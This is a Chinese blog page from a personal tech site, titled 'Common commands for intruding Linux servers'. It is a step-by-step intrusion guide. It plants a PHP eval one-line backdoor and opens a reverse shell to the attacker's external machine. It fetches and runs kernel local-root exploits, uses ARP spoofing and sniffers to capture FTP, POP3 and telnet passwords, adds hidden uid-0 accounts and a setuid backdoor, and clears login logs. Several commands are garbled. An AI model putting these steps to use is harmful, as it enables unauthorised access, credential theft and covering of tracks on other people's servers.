@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="linux,入侵,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="写个php一句话后门上去：12$ echo -e &quot;&amp;lt;?php @eval($_POST[md5])?&amp;gt;&quot; &amp;gt;rankuplog_time.php​$ cat rankuplog_time.php  1.linux的想着先跨站。 shell浏览目标站不行，命令行下输入 1ls -la /www.users/  2.溢出提权 1# python –c ‘impotr pty;pty">
+<meta name="keywords" content="linux,入侵">
+<meta property="og:type" content="article">
+<meta property="og:title" content="入侵Linux服务器常用命令">
+<meta property="og:url" content="http://pibigstar.com/2019/03/25/入侵Linux服务器常用命令/index.html">
+<meta property="og:site_name" content="派大星的博客">
+<meta property="og:description" content="写个php一句话后门上去：12$ echo -e &quot;&amp;lt;?php @eval($_POST[md5])?&amp;gt;&quot; &amp;gt;rankuplog_time.php​$ cat rankuplog_time.php  1.linux的想着先跨站。 shell浏览目标站不行，命令行下输入 1ls -la /www.users/  2.溢出提权 1# python –c ‘impotr pty;pty">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-30T03:12:59.140Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="入侵Linux服务器常用命令">
+<meta name="twitter:description" content="写个php一句话后门上去：12$ echo -e &quot;&amp;lt;?php @eval($_POST[md5])?&amp;gt;&quot; &amp;gt;rankuplog_time.php​$ cat rankuplog_time.php  1.linux的想着先跨站。 shell浏览目标站不行，命令行下输入 1ls -la /www.users/  2.溢出提权 1# python –c ‘impotr pty;pty">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://pibigstar.com/2019/03/25/入侵Linux服务器常用命令/">
+
+
+
+
+
+  <title>入侵Linux服务器常用命令 | 派大星的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">派大星的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">很多事情不是会了才能做，而是做了才能学会</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            Schedule
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://pibigstar.com/2019/03/25/入侵Linux服务器常用命令/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="派大星">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/qq.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="派大星的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">入侵Linux服务器常用命令</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-25T10:10:04+08:00">
+                2019-03-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux,渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="写个php一句话后门上去："><a href="#写个php一句话后门上去：" class="headerlink" title="写个php一句话后门上去："></a>写个php一句话后门上去：</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -e <span class="string">"&lt;?php @eval(<span class="variable">$_POST</span>[md5])?&gt;"</span> &gt;rankuplog_time.php</span><br><span class="line">​$ cat rankuplog_time.php</span><br></pre></td></tr></table></figure>
+
+<p>1.linux的想着先跨站。</p>
+<p>shell浏览目标站不行，命令行下输入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /www.users/</span><br></pre></td></tr></table></figure>
+
+<p>2.溢出提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python –c ‘impotr pty;pty.spawn(“/bin/sh”);</span></span><br></pre></td></tr></table></figure>
+
+<p>来得到交互的Shell,一般的系统都默认安装python</p>
+<p><strong>输入id</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-3.2$ id</span><br><span class="line">uid=529(zeicom) gid=525(zeicom) groups=525(zeicom)</span><br><span class="line">bash-3.2$</span><br></pre></td></tr></table></figure>
+
+<p>这里uid=529(zeicom)还不是root权限，</p>
+<p><strong>输入uname –r</strong><br>返回：2.6.18-164.11.1.el5PAE</p>
+<h2 id="2-Linux提权大致可分为"><a href="#2-Linux提权大致可分为" class="headerlink" title="2. Linux提权大致可分为"></a>2. Linux提权大致可分为</h2><ul>
+<li>第三方软件漏洞</li>
+<li>本地信任特性</li>
+<li>内核溢出</li>
+</ul>
+<h3 id="找对应的exp"><a href="#找对应的exp" class="headerlink" title="找对应的exp"></a>找对应的exp</h3><p>这里地址整理很齐全可以这里下</p>
+<ul>
+<li><a href="http://tools.90sec.org/" target="_blank" rel="noopener">http://tools.90sec.org/</a></li>
+<li><a href="http://sebug.net/paper/linux_exp/" target="_blank" rel="noopener">http://sebug.net/paper/linux_exp/</a></li>
+<li><a href="http://x73.cc/bitch/exp/" target="_blank" rel="noopener">http://x73.cc/bitch/exp/</a></li>
+<li><a href="http://www.exploit-db.com/search/" target="_blank" rel="noopener">http://www.exploit-db.com/search/</a></li>
+</ul>
+<hr>
+<ol>
+<li>命令输入pwd,这个命令是显示当前目录，</li>
+<li>先看能不能编译  gcc -help</li>
+<li>当前目录就是shell的目录，我在shell上传2.c</li>
+<li>反弹shell  到外网自己机器的12345端口  </li>
+<li>上外网服务器 本地监听 nc -lvvp 12345</li>
+</ol>
+<p>一般都能得到一个apache交互的shell 有时候又不行</p>
+<p>这时候  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python -c  impotr pty;pty.spawn("/bin/sh");</span></span><br></pre></td></tr></table></figure>
+
+<p>然后</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进入tmp目录 </span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"># 创建一个Papers的目录 Papers不显眼        </span><br><span class="line"><span class="built_in">mkdir</span> Papers   </span><br><span class="line"># 进入 Papers目录</span><br><span class="line"><span class="built_in">cd</span> Papers      </span><br><span class="line"># 查看当前目录   </span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
+
+<p>然后命令输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 下载exp的URL</span><br></pre></td></tr></table></figure>
+
+<p> 把2.c编译成可执行文件 g++ keio.cc -o keio</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc –o 2 2.c</span><br></pre></td></tr></table></figure>
+
+<p>给2有执行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 2</span><br></pre></td></tr></table></figure>
+
+<p>执行2,  溢出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./2</span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I/usr/local/include -L/usr/local/lib -o arpsniffer arpsniffer.c -lpcap -lnet</span><br></pre></td></tr></table></figure>
+
+<p>确定arpsniffer.c需要先装pcap和 libnet。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rpm -ivh libnet-1.1.2.1-2.1.fc2.rf.i386.rpm</span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">wget http://downloads.sourceforge.net/libpcap/libpcap-0.8.1.tar.gz?modtime=1072656000&amp;big_mirror=0</span><br><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf libpcap-0.8.1.tar.gz</span><br><span class="line"><span class="comment"># 进入目录</span></span><br><span class="line"><span class="built_in">cd</span> libpcap-0.8.1</span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">./configure</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">make</span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+
+<p>重新编译arpsniffer.c<br>再次执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I/usr/<span class="built_in">local</span>/include -L/usr/<span class="built_in">local</span>/lib -o arpsniffer arpsniffer.c -lpcap -lnet</span><br></pre></td></tr></table></figure>
+
+<p>这次没报错，编译成功。<br>运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./arpsniffer -I eth0 -M 192.168.0.6 -W 192.168.0.4 -S 192.168.0.254</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-下面开始欺骗"><a href="#3-下面开始欺骗" class="headerlink" title="3. 下面开始欺骗"></a>3. 下面开始欺骗</h1><p>由于是服务器端，因此我们欺骗网关：<br>（网络环境如下，邮件服务器ip：192.168.0.11 网关：192.168.0.1 本机：192.168.0.77）<br>执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./arpsniffer -I eth0 -M 192.168.0.77 -W 192.168.0.1 -S 192.168.0.11 -P 110</span><br></pre></td></tr></table></figure>
+
+<p>在另一个登录里面用tcpdump监听下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 host 192.168.0.11</span><br></pre></td></tr></table></figure>
+
+<p>发现有数据，把监听的数据存在文件里面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 host 172.16.0.12 -w pop.txt</span><br></pre></td></tr></table></figure>
+
+<p>10分钟后停止，在SecureCRT下用sz命令下载pop.txt到本地，然后用Ethereal分析。</p>
+<p>下面我们就可以用linsniffer监听我们想要的用户名和密码了。</p>
+<p>先修改linsniffer.c：根据自己的需求监听相应的应用密码。我的如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==21)  p=1; /* ftp */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==22)  p=1; /* ssh <span class="keyword">for</span> comparison added <span class="keyword">for</span> example only comment out <span class="keyword">if</span> desired*/</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==23)  p=1; /* telnet */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==80) p=1;  /* http */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==110) p=1; /* pop3 */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==513) p=1; /* rlogin */</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(ntohs(tcp-&gt;dest)==106) p=1; /* poppasswd */</span><br></pre></td></tr></table></figure>
+
+<p>编译执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@pibigstar root]<span class="comment"># gcc -o linsniffer linsniffer.c</span></span><br></pre></td></tr></table></figure>
+
+<p>会提示下面</p>
+<blockquote>
+<p>In file included from /usr/include/linux/tcp.h:21,<br>from linsniffer.c:32:<br>/usr/include/asm/byteorder.h:6:2: warning: #warning using private kernel header; include &lt;endian.h&gt; instead!</p>
+</blockquote>
+<p>不用管警告，直接运行编译后的linsniffer即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@pibigstar root]<span class="comment"># ./linsniffer</span></span><br></pre></td></tr></table></figure>
+
+<p>用户名和密码都自动存到了tcp.log下。</p>
+<h1 id="4-利用跨站代码"><a href="#4-利用跨站代码" class="headerlink" title="4.利用跨站代码"></a>4.利用跨站代码</h1><p>linux不提权跨目录访问的代码 </p>
+<p>linux权限多设的比较松的其实，但有的虚拟机还是不能跨目录访问的。</p>
+<p>在提不了权的情况下，试试如下代码吧。运气好的话说不定就跨过去了。</p>
+<p>代码如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$path</span> = stripslashes(<span class="variable">$_GET</span>[ path ]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ok</span> = chmod (<span class="variable">$path</span> , 0777);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ok</span> == <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> CHMOD OK , Permission editable file or directory. Permission to write;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>把上面代码保存为tmdsb.PHP</p>
+<p>然后访问<a href="http://www.tmdsb.com/tmdsb.php?path=../../要跨的目录/index.php" target="_blank" rel="noopener">http://www.tmdsb.com/tmdsb.php?path=../../要跨的目录/index.php</a></p>
+<p>这里的index.PHP是要修改权限的文件。</p>
+<p>收集的另一个exp：</p>
+<p>把下面的代码保存为exp.PHP</p>
+<p>代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@<span class="variable">$filename</span> = stripslashes(<span class="variable">$_POST</span>[ filename ]);</span><br><span class="line"></span><br><span class="line">@<span class="variable">$mess</span> = stripslashes(<span class="variable">$_POST</span>[ mess ]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = @fopen(&#123;<span class="variable">$_POST</span>[ filename ]&#125;,  a );</span><br><span class="line"></span><br><span class="line">@fputs(<span class="variable">$fp</span>,<span class="variable">$mess</span> </span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">@fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最终Linux Kernel &lt; 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)这个0day溢出成功</p>
+<h1 id="5-udev提权"><a href="#5-udev提权" class="headerlink" title="5. udev提权"></a>5. udev提权</h1><p>换了个udev提权，适用于内核范围为2.6.*。</p>
+<p>还是上传文件至服务器shell所在目录，执行命令ls，发现文件已经躺在那里面了，之后赋予exp执行权限。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +x pwnkernel.c</span><br><span class="line"></span><br><span class="line">chmod +x wunderbar_emporium.sh</span><br><span class="line"></span><br><span class="line">chmod +x exploit.c</span><br></pre></td></tr></table></figure>
+
+<p>之后执行<code>./w*</code>溢出</p>
+<p>成功溢出，root权限。</p>
+<p>之后就是留下一个后门~ 添加一个root权限用户俺也不介意。。。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -u 0 -o <span class="string">"username"</span></span><br></pre></td></tr></table></figure>
+
+<p>依次输入命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">ls /lib/ld-linux*</span><br><span class="line"></span><br><span class="line">cp /lib/ld-linux.so.2 /tmp/.str1ven</span><br><span class="line"></span><br><span class="line">ls -l .str1ven</span><br><span class="line"></span><br><span class="line">chmod +s .str1ven</span><br><span class="line"></span><br><span class="line">ls -l .str1ven</span><br></pre></td></tr></table></figure>
+
+<p>-rwsr-sr-x 1 root root 121684 07-08 21:13 .str1ven</p>
+<p>成功建立一个后门，退出root，执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./.str1ven `<span class="built_in">which</span> whoami`</span><br></pre></td></tr></table></figure>
+
+<p>又成功获取root权限~~ </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看linux用户</span></span><br><span class="line">cat /etc/passwd </span><br><span class="line"><span class="comment"># 查看用户密码需要root权限</span></span><br><span class="line">cat /etc/shadow </span><br><span class="line"><span class="comment"># N代表网卡号 查看所在网卡的ip信息</span></span><br><span class="line">cat /etc/sysconfig/network-scripts/ifcfg-ethn </span><br><span class="line"><span class="comment"># 查看本机ip信息</span></span><br><span class="line">ifconfig </span><br><span class="line"><span class="comment"># 查看DNS信息</span></span><br><span class="line">cat /etc/resolv.conf </span><br><span class="line">在反弹的shell中使用可以直观显示命令</span><br><span class="line">bash -i</span><br></pre></td></tr></table></figure>
+
+<p><strong>bash prompt:</strong><br>当你以普通限权用户身份进入的时候，一般你会有一个类似bash$的prompt。当你以Root登陆时，你的prompt会变成bash#。</p>
+<p><strong>系统变量:</strong><br>试着<code>echo &quot;$USER / $EUID&quot;</code>系统应该会告诉你它认为你是什么用户。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;/proc/sys/net/ipv4/if_forward,1&gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="comment"># 修改,默认是0,也就是内核不进行数据包过滤,改为1 ,让内核对数据包进行filter处理!</span></span><br><span class="line">vim /proc/sys/net/ipv4/ip_forward </span><br><span class="line"><span class="comment"># 查看80端口的进程</span></span><br><span class="line">netstat -an |grep LISTEN |grep :80 查看端口</span><br><span class="line"><span class="comment"># 服务正在运行的进程</span></span><br><span class="line">service --status-all | grep running</span><br><span class="line"><span class="comment"># 服务为http的进程</span></span><br><span class="line">service --status-all | grep http</span><br><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">lsb_release -a </span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启ssh服务 ：</span></span><br><span class="line">/usr/sbin/sshd stop/</span><br><span class="line">usr/sbin/sshd start</span><br></pre></td></tr></table></figure>
+
+<p>ssd_config文件里</p>
+<p><code>PasswordAuthentication no</code></p>
+<p>将其改为</p>
+<p><code>PasswordAuthentication yes</code></p>
+<p>远程ssh才可登录</p>
+<p>否则显示<code>Access denied</code></p>
+<p>其中Usepam yes可能用来建立pam方式login，比如从其它linux主机ssh到服务端，如果关闭，则不能打开.</p>
+<h2 id="su的菜鸟用法"><a href="#su的菜鸟用法" class="headerlink" title="su的菜鸟用法"></a>su的菜鸟用法</h2><p>先</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chomod 777 /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>然后修改bin用户的gid和uid为0</p>
+<p>然后passwd设置bin的密码</p>
+<p>然后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<p>然后su的时候</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - bin</span><br></pre></td></tr></table></figure>
+
+<p>就可以到rootshell了。</p>
+<p>这个原理就是当ssh不允许root用ssh终端登陆的时候，我们又不知道root密码的一种很菜鸟的做法。</p>
+<p><strong>还可以这样</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/bin:x:1:1/bin:x:0:1/g /etc/passwd</span><br><span class="line"></span><br><span class="line">gcc prtcl2.c –o <span class="built_in">local</span> –static –Wall</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nosec:x:0:0::/:/bin/sh"</span> &gt;&gt; /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nosec::-1:-1:-1:-1:-1:-1:500"</span> &gt;&gt; /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空last记录 </span></span><br><span class="line">cp /dev/null /var/<span class="built_in">log</span>/wtmp</span><br></pre></td></tr></table></figure>
+
+<p>建立一个100m的大文件在利用Linux Kernel &lt;= 2.6.17.4 (proc) Local Root Exploit提权的时候要用到的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dd <span class="keyword">if</span>=/dev/zero of=yourfile bs=10M count=10 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 开22端口</span></span><br><span class="line">/etc/init.d/ssh start   </span><br><span class="line"><span class="comment"># SSH服务配置文件</span></span><br><span class="line">/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/linux/" rel="tag"><i class="fa fa-tag"></i> linux</a>
+          
+            <a href="/tags/入侵/" rel="tag"><i class="fa fa-tag"></i> 入侵</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/24/SpringBoot前后端数据传输加密/" rel="next" title="SpringBoot前后端数据传输加密">
+                <i class="fa fa-chevron-left"></i> SpringBoot前后端数据传输加密
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
